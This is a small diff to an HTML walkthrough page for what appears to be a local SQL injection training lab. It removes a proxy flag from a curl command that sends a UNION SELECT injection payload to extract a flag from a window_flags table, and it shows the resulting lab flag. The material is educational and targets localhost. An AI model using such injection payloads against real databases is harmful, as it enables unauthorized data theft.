@@ -100,7 +100,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab8" \<br> --data-urlencode "player=XYZNOTEXIST' UNION SELECT flag_value, NULL, NULL, NULL FROM window_flags -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab8" \<br> --data-urlencode "player=XYZNOTEXIST' UNION SELECT flag_value, NULL, NULL, NULL FROM window_flags -- -"<br><br>
         <span class="prompt">Result: </span>Rank: # | Player: <strong>FLAG{ma_w1nd0w_func_3xtr4ct}</strong>
     </div>
 </div>
